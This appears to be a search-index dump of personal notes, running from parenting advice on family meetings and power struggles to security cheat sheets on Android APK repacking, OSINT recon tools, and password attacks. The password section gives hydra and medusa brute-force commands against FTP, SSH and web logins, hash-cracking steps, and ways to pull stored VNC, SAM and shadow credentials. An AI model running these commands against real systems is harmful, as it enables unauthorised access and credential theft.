acknowledge other members on positive things they noticed this week Discovery Time - learning together as a family Week in Review What worked well in our family this week? What went wrong in our family this week? What will we work on this coming week? Problem-Solving resolving problems or issues that individual family members have placed on the agenda try to solve only one problem a week Weekly Planning Trips, concerts, sports events chores Fun Activity - playing a game, watching a movie, or making pizza together","title":"Family Meetings"},{"location":"non-security/#power-struggle","text":"Misbehave to: Belong Feel loved feel powerful Feel valuable Feel like they have a place Experiment and explore Adlerian Psychology Misbehaving = Discouraged (from getting one of these needs met). Identify child's mistaken goals and provide a better way of getting to those. Mistaken Goals Attention Feel special and feel loved by keeping parent busy Parent Feel: Irritated, annoyed, frustrated, distracted, manipulated Power Parent Feel: Provoked, anger, challenged Revenge I feel hurt, hence I'm going to make you hurt Parent Feel: Hurt, mad, want to get even Avoidance Parent Feel: Feel sorry for child, despair, helpless coaxes or shows pity Side Stepping the Power Struggle Joy of Opposing when Power Struggle with someone Drop parent's end of tug of war by stopping talking Without disrespecting or doing something mean. Preventing Joy of Opposing Do not escalate your emotional response. (Example: Loud \"no\"s with each attempt) Respond like a broken record (repetition) To play in garden , you are going to learn not to do X . And drop child in a different place , until child stop doing X Repetition and Redirection . Cannot learn when in a power struggle - in stress (reptilian brain). Repetition help keeping prefrontal brain active and learn. Kind and Firm Find middle ground between kindness and firmness Better to be more firm than kind Given-in from time to time, but don't let them completely win power struggle. Dance of Corporation How to Get Out of A Power Struggle Use loving guidance Words fuel power struggle. Use less words (no is better). Approach calmly. Use eye contact / non-verbal signals to give the message. Find useful ways for the child to feel valuable and powerful Example: Give his own drawer in kitchen for his stuff Teach them to say \"no\" respectfully If saying \"no\" was not an option, kids will find alternatives like arguing Offer choices Choices should be aged appropriately to let the kid feel empowered Concrete choices \"Do you want to wear the red pants or the blue pants?\" Choices with incentives \"Do you want to go to bed now and I'll read you 3 stories or go to bed in 5 minutes and I'll read you one story?\" Playful choices \"Do you want to walk to bed or run to bed?\" Immediate choices \"Do you want to go to bed now or now?\" Choices with consequences \"You may play with the truck on the floor or choose a soft toy to play with on the table. If you run the truck on the table again, I will take the truck away.\" Do the unexpected Do something unexpected / fun to break the attention to power struggle Then get back to the original task. Don't let the kids get away Example: Dance before bed (when power struggling about bed time) Win/Win negotiate Flexible Usable with a child who does what he say he will Negotiate what happens if task is not done If child is not accountable with the negotiation, don't use this technique \"I see that's a win for you and I want you to win. But I want to win too......\" Let go of your position Listening to child Use a signal Let child make a signal (word of a sign) to start a task Example: \"Broccoli\" is the sign to \"stop fighting\" Preventing Power Struggles Talk Less (use actions) Use One Word (in sing sung voice) Be firm and kind - and follow through Do what you say. Show that you mean the consequences. Say no in a friendly way That\u2019s not an option I am unwilling... Say it in a funny way, i.e. \"Never in a million trillion years!\" Sing, no, no, no! That\u2019s not appropriate. I am not ready for you to do that yet. (Great for teens) For a younger child, use distraction Ask, \"What do you think you would need to do before I would be willing to say yes to that?\" Ask, \"What do you think? Is this a good choice for you?\" (If you choose this, make sure you are willing to abide by her answer) For a youngster that has something you don\u2019t want him to have say, \"That\u2019s not a toy.\" Ask, \"What are your other options?\" No, but I would be willing to... I appreciate your asking, however... Walls are not for coloring. Here is a piece of paper. Tell them what to do instead i.e., \"Water needs to stay in the tub.\" This is not negotiable Let them have the last word Don't give in (and show that if forced enough you are ready to do something) Be patience and just wait until kid give up Catch them doing well and acknowledge them Little reward (ex: join and play with them) when doing well Let them know how valuable they are to you Ex: Appreciate a hug Make it fun Seek first to understand Don\u2019t major in the minors Pick on the battles you can win If most things are flexible, kids tend to be more likely to comply with your major requests Use GEMS (Genuine Encounter Moments) See world through the child's eyes and be with him Take 3 minutes to 30 seconds to handle a GEM Let them feel: \"What is important to me, is important to my parent\" Cannot handle all GEMS. Hence, depending on importance of your work handle some. Options: Do a GEM Set temporary limit: It's OK to tell him to give 10 minutes. But make sure you'll be there by 10 minutes (Trust). Redirect the attention.","title":"Power Struggle"},{"location":"operating-systems/","text":"Linux Windows Android Quick Reference Take screenshots from ADB: adb shell screencap - p | perl - pe s/\\x0D\\x0A/\\x0A/g screen . png Tools A framework for automated extraction of static and dynamic features from Android applications: https://github.com/alexMyG/AndroPyTool Issues seccomp ptrace Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/ Techniques Dynamic Analysis # unpack and decompile whole APK to be patched later apktool d application.apk -o re_project0/ # create folder for all decompiled smali sources mkdir -p re_project0/src # copy all the smali code to sources folder cp -R re_project0/smali*/* re_project0/src application android:debuggable= true android:allowBackup= true android:icon= @mipmap/ic_launcher android:label= @string/app_name android:largeHeap= true android:name= org.horaapps.leafpic.App android:theme= @style/Theme.AppCompat apktool b re_project0/ keytool -genkey -v -keystore key.keystore -alias sign -keyalg RSA -keysize 2048 -validity 10000 References https://malacupa.com/2018/11/11/debug-decompiled-smali-code-in-android-studio-3.2.html iOS Codes * 5005 * 78283 # Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc https://twitter.com/userlandkernel/status/1081627817975128069 *# 5005 * 5667 # Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473 References iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/ MacOS Important files / etc / fstab / etc / master . passwd / etc / resolv . conf / etc / sudoers / etc / sysctl . conf Defense Tools xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon Solaris https://blogs.oracle.com/solaris/understading-rbac-v2","title":"Operating systems"},{"location":"operating-systems/#linux","text":"","title":"Linux"},{"location":"operating-systems/#windows","text":"","title":"Windows"},{"location":"operating-systems/#android","text":"","title":"Android"},{"location":"operating-systems/#quick-reference","text":"Take screenshots from ADB: adb shell screencap - p | perl - pe s/\\x0D\\x0A/\\x0A/g screen . png","title":"Quick Reference"},{"location":"operating-systems/#tools","text":"A framework for automated extraction of static and dynamic features from Android applications: https://github.com/alexMyG/AndroPyTool","title":"Tools"},{"location":"operating-systems/#issues","text":"seccomp ptrace Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/","title":"Issues"},{"location":"operating-systems/#techniques","text":"Dynamic Analysis # unpack and decompile whole APK to be patched later apktool d application.apk -o re_project0/ # create folder for all decompiled smali sources mkdir -p re_project0/src # copy all the smali code to sources folder cp -R re_project0/smali*/* re_project0/src application android:debuggable= true android:allowBackup= true android:icon= @mipmap/ic_launcher android:label= @string/app_name android:largeHeap= true android:name= org.horaapps.leafpic.App android:theme= @style/Theme.AppCompat apktool b re_project0/ keytool -genkey -v -keystore key.keystore -alias sign -keyalg RSA -keysize 2048 -validity 10000","title":"Techniques"},{"location":"operating-systems/#references","text":"https://malacupa.com/2018/11/11/debug-decompiled-smali-code-in-android-studio-3.2.html","title":"References"},{"location":"operating-systems/#ios","text":"","title":"iOS"},{"location":"operating-systems/#codes","text":"* 5005 * 78283 # Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc https://twitter.com/userlandkernel/status/1081627817975128069 *# 5005 * 5667 # Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473","title":"Codes"},{"location":"operating-systems/#references_1","text":"iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/","title":"References"},{"location":"operating-systems/#macos","text":"","title":"MacOS"},{"location":"operating-systems/#important-files","text":"/ etc / fstab / etc / master . passwd / etc / resolv . conf / etc / sudoers / etc / sysctl . conf","title":"Important files"},{"location":"operating-systems/#defense","text":"Tools xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon","title":"Defense"},{"location":"operating-systems/#solaris","text":"https://blogs.oracle.com/solaris/understading-rbac-v2","title":"Solaris"},{"location":"osint/","text":"OSINT Cheatsheets https://github.com/jivoi/awesome-osint Tools SpiderFoot automates OSINT collection so that you can focus on analysis. https://github.com/smicallef/spiderfoot OSINT search engine: https://intelx.io/ https://intelx.io/tools Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: - https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library. https://github.com/nabla-c0d3/sslyze OSINT-SPY - Performs OSINT scan on email/domain/ip_address/organization - https://github.com/SharadKumar97/OSINT-SPY Vanquish is Kali Linux based Enumeration Orchestrator - https://github.com/frizb/Vanquish | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident - user - enum | Smtp - user - enum | Snmp - check | Cisco - torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan - unixwiz | Xprobe2 | Blindelephant | Showmount | LazyRecon - An automated approach to performing recon for bug bounty hunting and penetration testing - https://github.com/capt-meelo/LazyRecon/ - Subdomain Enumeration : - [ Amass ] ( https : // github . com / OWASP / Amass ) - [ Subfinder ] ( https : // github . com / subfinder / subfinder ) - Subdomain Takeover : - [ subjack ] ( https : // github . com / haccer / subjack ) - CORS Configuration : - [ CORScanner ] ( https : // github . com / chenjj / CORScanner ) - IP Discovery : - [ Massdns ] ( https : // github . com / blechschmidt / massdns ) - Port Scanning : - [ Masscan ] ( https : // github . com / robertdavidgraham / masscan ) - [ Nmap ] ( https : // nmap . org / ) - [ Nmap Bootstrap Stylesheet ] ( https : // github . com / honze - net / nmap - bootstrap - xsl / ) - Visual Recon : - [ Aquatone ] ( https : // github . com / michenriksen / aquatone ) - Content Discovery : - [ Dirsearch ] ( https : // github . com / maurosoria / dirsearch ) - Wordlists : - [ JHaddix s all.txt ] ( https : // gist . github . com / jhaddix / f64c97d0863a78454e44c2f7119c2a6a ) - [ SecLists raft-large-words.txt ] ( https : // github . com / danielmiessler / SecLists / blob / master / Discovery / Web - Content / raft - large - words . txt ) pown-recon - A powerful target reconnaissance framework powered by graph theory. - https://github.com/pownjs/pown-recon Streamline the bug bounty/penetration test reconnaissance phase - https://github.com/SolomonSklash/chomp-scan - Subdomain Discovery ( 3 different sized wordlists ) - dnscan - subfinder - sublist3r - massdns + altdns - subjack - Screenshots ( optional ) - aquatone - Port Scanning ( optional ) - masscan and / or nmap - Content Discovery ( optional ) ( 4 different sized wordlists ) - ffuf - bfac - nikto - whatweb - Wordlists - Subdomain Bruteforcing - subdomains - top1mil - 20000 . txt - 22 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - sortedcombined - knock - dnsrecon - fierce - reconng . txt - 102 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - huge - 200 k - 199 k words - A combination I made of various wordlists , including Seclists - Content Discovery - big . txt - 20 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - raft - large - combined . txt - 167 k words - A combination of the raft wordlists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - seclists - combined . txt - 215 k words - A larger combination of all the Discovery / DNS lists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - haddix_content_discovery_all . txt - 373 k words - Jason Haddix s [all](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10/) content discovery list - haddix - seclists - combined . txt - 486 k words - A combination of the two previous lists - Misc . - altdns - words . txt - 240 words - Used for creating domain permutations for [ masscan ] ( https : // github . com / robertdavidgraham / masscan ) to resolve . Borrowed from [ altdns ] ( https : // github . com / infosec - au / altdns / blob / master / words . txt ) . - interesting . txt - 42 words - A list I created of potentially interesting words appearing in domain names . Monitoring Solutions https://www.dehashed.com/ https://www.spiderfoot.net/ Email TheHarvester theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b google theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b bing Domain Related Tools Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ AltDNS - Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns Subdomains Finds subdomains in google, bing, etc: python theHarvester . py - l 500 - b all - d $ ip Sublist3r enumerates subdomains using many search engines and tools: https://github.com/aboul3la/Sublist3r SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy - Enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/ Subdomain to IP Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783 Services https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/ https://urlscan.io/ https://fofa.so/ https://dnsrecords.io/ Web AQUATONE - visual inspection of websites across a large amount of hosts - https://github.com/michenriksen/aquatone EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness GitHub Rapidly search through troves of public data on GitHub - https://github.com/BishopFox/GitGot gitrob, gitminer, githound, gitleaks, trufflehog Ah shhgit! Find GitHub secrets in real time: https://github.com/eth0izzle/shhgit A tool to capture all the git secrets by leveraging multiple open source git searching tools: https://github.com/anshumanbh/git-all-secrets truffleHog - scans commits for high entropy strings and user provided regular expressions, repo-supervisor - scans for high entropy strings in .js and .json files Searches through git repositories for high entropy strings and secrets, digging deep into commit history: https://github.com/dxa4481/truffleHog Scan your code for security misconfiguration, search for passwords and secrets: https://github.com/auth0/repo-supervisor Social LikedIn: https://github.com/vysecurity/LinkedInt Visualizing Visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a OS (VM) Buscador Investigative Operating System: https://inteltechniques.com/buscador/ Tool Examples ReconNG General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails . txt run Search Showdan for host names: use recon / domains - hosts / shodan_hostname run show hosts show ports Reporting: use report / list show options set FILNAME / location / on / file / system run use reporting / html show options set CREATOR Pentester set COMPANY United Airlines References New References Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way References List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be https://ahrefs.com/blog/google-advanced-search-operators/ https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/","title":"OSINT"},{"location":"osint/#osint","text":"","title":"OSINT"},{"location":"osint/#cheatsheets","text":"https://github.com/jivoi/awesome-osint","title":"Cheatsheets"},{"location":"osint/#tools","text":"SpiderFoot automates OSINT collection so that you can focus on analysis. https://github.com/smicallef/spiderfoot OSINT search engine: https://intelx.io/ https://intelx.io/tools Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: - https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library. https://github.com/nabla-c0d3/sslyze OSINT-SPY - Performs OSINT scan on email/domain/ip_address/organization - https://github.com/SharadKumar97/OSINT-SPY Vanquish is Kali Linux based Enumeration Orchestrator - https://github.com/frizb/Vanquish | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident - user - enum | Smtp - user - enum | Snmp - check | Cisco - torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan - unixwiz | Xprobe2 | Blindelephant | Showmount | LazyRecon - An automated approach to performing recon for bug bounty hunting and penetration testing - https://github.com/capt-meelo/LazyRecon/ - Subdomain Enumeration : - [ Amass ] ( https : // github . com / OWASP / Amass ) - [ Subfinder ] ( https : // github . com / subfinder / subfinder ) - Subdomain Takeover : - [ subjack ] ( https : // github . com / haccer / subjack ) - CORS Configuration : - [ CORScanner ] ( https : // github . com / chenjj / CORScanner ) - IP Discovery : - [ Massdns ] ( https : // github . com / blechschmidt / massdns ) - Port Scanning : - [ Masscan ] ( https : // github . com / robertdavidgraham / masscan ) - [ Nmap ] ( https : // nmap . org / ) - [ Nmap Bootstrap Stylesheet ] ( https : // github . com / honze - net / nmap - bootstrap - xsl / ) - Visual Recon : - [ Aquatone ] ( https : // github . com / michenriksen / aquatone ) - Content Discovery : - [ Dirsearch ] ( https : // github . com / maurosoria / dirsearch ) - Wordlists : - [ JHaddix s all.txt ] ( https : // gist . github . com / jhaddix / f64c97d0863a78454e44c2f7119c2a6a ) - [ SecLists raft-large-words.txt ] ( https : // github . com / danielmiessler / SecLists / blob / master / Discovery / Web - Content / raft - large - words . txt ) pown-recon - A powerful target reconnaissance framework powered by graph theory. - https://github.com/pownjs/pown-recon Streamline the bug bounty/penetration test reconnaissance phase - https://github.com/SolomonSklash/chomp-scan - Subdomain Discovery ( 3 different sized wordlists ) - dnscan - subfinder - sublist3r - massdns + altdns - subjack - Screenshots ( optional ) - aquatone - Port Scanning ( optional ) - masscan and / or nmap - Content Discovery ( optional ) ( 4 different sized wordlists ) - ffuf - bfac - nikto - whatweb - Wordlists - Subdomain Bruteforcing - subdomains - top1mil - 20000 . txt - 22 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - sortedcombined - knock - dnsrecon - fierce - reconng . txt - 102 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - huge - 200 k - 199 k words - A combination I made of various wordlists , including Seclists - Content Discovery - big . txt - 20 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - raft - large - combined . txt - 167 k words - A combination of the raft wordlists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - seclists - combined . txt - 215 k words - A larger combination of all the Discovery / DNS lists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - haddix_content_discovery_all . txt - 373 k words - Jason Haddix s [all](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10/) content discovery list - haddix - seclists - combined . txt - 486 k words - A combination of the two previous lists - Misc . - altdns - words . txt - 240 words - Used for creating domain permutations for [ masscan ] ( https : // github . com / robertdavidgraham / masscan ) to resolve . Borrowed from [ altdns ] ( https : // github . com / infosec - au / altdns / blob / master / words . txt ) . - interesting . txt - 42 words - A list I created of potentially interesting words appearing in domain names .","title":"Tools"},{"location":"osint/#monitoring-solutions","text":"https://www.dehashed.com/ https://www.spiderfoot.net/","title":"Monitoring Solutions"},{"location":"osint/#email","text":"TheHarvester theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b google theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b bing","title":"Email"},{"location":"osint/#domain-related-tools","text":"Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ AltDNS - Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns Subdomains Finds subdomains in google, bing, etc: python theHarvester . py - l 500 - b all - d $ ip Sublist3r enumerates subdomains using many search engines and tools: https://github.com/aboul3la/Sublist3r SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy - Enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/","title":"Domain Related Tools"},{"location":"osint/#subdomain-to-ip","text":"Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783","title":"Subdomain to IP"},{"location":"osint/#services","text":"https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/ https://urlscan.io/ https://fofa.so/ https://dnsrecords.io/","title":"Services"},{"location":"osint/#web","text":"AQUATONE - visual inspection of websites across a large amount of hosts - https://github.com/michenriksen/aquatone EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness","title":"Web"},{"location":"osint/#github","text":"Rapidly search through troves of public data on GitHub - https://github.com/BishopFox/GitGot gitrob, gitminer, githound, gitleaks, trufflehog Ah shhgit! Find GitHub secrets in real time: https://github.com/eth0izzle/shhgit A tool to capture all the git secrets by leveraging multiple open source git searching tools: https://github.com/anshumanbh/git-all-secrets truffleHog - scans commits for high entropy strings and user provided regular expressions, repo-supervisor - scans for high entropy strings in .js and .json files Searches through git repositories for high entropy strings and secrets, digging deep into commit history: https://github.com/dxa4481/truffleHog Scan your code for security misconfiguration, search for passwords and secrets: https://github.com/auth0/repo-supervisor","title":"GitHub"},{"location":"osint/#social","text":"LikedIn: https://github.com/vysecurity/LinkedInt","title":"Social"},{"location":"osint/#visualizing","text":"Visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a","title":"Visualizing"},{"location":"osint/#os-vm","text":"Buscador Investigative Operating System: https://inteltechniques.com/buscador/","title":"OS (VM)"},{"location":"osint/#tool-examples","text":"","title":"Tool Examples"},{"location":"osint/#reconng","text":"General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails . txt run Search Showdan for host names: use recon / domains - hosts / shodan_hostname run show hosts show ports Reporting: use report / list show options set FILNAME / location / on / file / system run use reporting / html show options set CREATOR Pentester set COMPANY United Airlines","title":"ReconNG"},{"location":"osint/#references","text":"","title":"References"},{"location":"osint/#new-references","text":"Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way","title":"New References"},{"location":"osint/#references_1","text":"List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be https://ahrefs.com/blog/google-advanced-search-operators/ https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/","title":"References"},{"location":"password-attacks/","text":"Quick Reference Finding Passwords grep - rl hash grep - rl password Mutate wordlists / etc / john / john . conf $ [ 0 - 9 ] $ [ 0 - 9 ] john --wordlist=out.txt --rules --stdout mutated.txt Password Cracking john hashes . txt Htaccess medusa - h ip - u admin - P passwords . txt - M http - m DIR : / admin - T 20 FTP hydra - l admin - P pass . txt - v ip ftp HTTP Post hydra - l none - P rockyou . txt 10 . 10 . 10 . 43 http - post - form /department/login.php:username=admin password=^PASS^:Invalid Password - t 64 - V SSH hydra - L usernames . txt - P passwords . txt - s 2222 ssh : // 10 . 10 . 10 . 66 - v - t 4 Basic Auth cewl example . com - m 6 - w / root / mega - cewl . txt 2 / dev / null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa - h admin . example . com - u admin - P mega - cewl - mutated . txt - M http - n 81 - m DIR : / admin - T 30 Salted Hash Cracking oclHashcat - input file should be in format: passwordhash : salt oclHashcat - plus64 . bin - m 110 hashes . txt .. / big - wordlist --force RSA Private Key Password Recovery ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT KeePass Password Recovery keepass2john jeeves . kdbx jeeves . hash john jeeves . hash VNC reg query HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Value : Password reg query HKCU \\ Software \\ TightVNC \\ Server Value : Password or PasswordViewOnly reg query HKLU \\ Software \\ TigerVNC \\ WinVNC4 reg query HKLM \\ Software \\ TigerVNC \\ WinVNC4 Value : Password C : \\ Program Files \\ UltraVNC \\ ultravnc . ini Value : passwd or passwd2 Linux Hash unshadow passwd . txt shadow . txt hashes . txt john \u2014 wordlist =/ usr / share / wordlists / rockyou . txt hashes . txt Cisco hashes python3 cisco_pwdecrypt . py - u \\$1\\$pdQG\\$o8nrSzsGXeaduXrjlvKc91 - d / usr / share / wordlists / rockyou . txt Decrypt gpg files: gpg \u2014 batch \u2014 passphrase whateverThePasswordIs - d theGPGfile WordPress: $ P$B9wJdX0NkO95U2L . kqAGXsFufwSp5N1 hashcat \u2014 force - m 400 hash . txt / usr / share / wordlists / rockyou . txt SSH key bruteforce - grep -lr against: https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys Zip files fcrackzip - u - D - p / usr / share / wordlists / rockyou . txt file_name zip2john file . zip file . zip . hash john - w : / usr / share / wordlists / rockyou . txt file . zip . hash SSH2john / usr / share / john / ssh2john . py id_rsa ssh . hash john - w : / usr / share / wordlists / rockyou . txt ssh . hash Narrow down into a custom wordlist: grep - i hentai / usr / share / wordlists / rockyou . txt pass . lst grep - i pokemon / usr / share / wordlists / rockyou . txt pass . lst grep - i monkey / usr / share / wordlists / rockyou . txt pass . lst grep - i startrek / usr / share / wordlists / rockyou . txt pass . lst /etc/passwd Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $ id$salt$hashed ( $ id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $ 1 $ is MD5 $ 2 a$ is Blowfish $ 2 y$ is Blowfish $ 5 $ is SHA-256 $ 6 $ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom = - --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n Update password echo username:password | chpasswd perl -e print crypt( YourPasswd , salt ), \\n echo username:encryptedPassWd | chpasswd -e OR useradd -p encryptedPassWd username SAM files C : \\ windows \\ system32 \\ config \\ sam C : \\ windows \\ repair \\ sam Encrypted with 128bit rivest cipher - the key to syskey utility is called \"bootkey\" which is stored in system file which is in C : \\ windows \\ repair \\ system use samdump2 , etc. to both get the syskey from system file and use that to decrypt the hashes from uncle Sam samdump2 system_file sam_file john outputfile . txt Tools Word-lists Wordhound - Wordlist generator that builds a list of password candidates for a specific target website: https://bitbucket.org/mattinfosec/wordhound/src/master/ Text sumarizer: 